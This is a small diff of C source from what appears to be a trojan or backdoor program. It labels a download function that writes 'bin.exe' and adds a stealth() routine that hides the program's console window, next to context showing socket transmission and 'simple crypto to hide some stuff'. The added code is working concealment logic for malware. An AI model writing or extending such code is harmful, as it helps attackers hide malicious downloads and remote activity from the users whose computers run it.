@@ -41,6 +41,9 @@ int iscommand(char buf)
 	}
 }
 
+/*Downloader func
+ */
+
 int download(char * url)
 {
 	char path[100] = "bin.exe";
@@ -120,6 +123,13 @@ int sendui(int s, char uin, int * bs)
 	return 0;
 }
 
+void stealth()
+{
+	HWND stealth;
+	AllocConsole();
+	stealth=FindWindowA("ConsoleWindowClass", NULL);
+	ShowWindow(stealth, 0);
+}
 
 /*
  *Verry simple crypo to hide some stuff
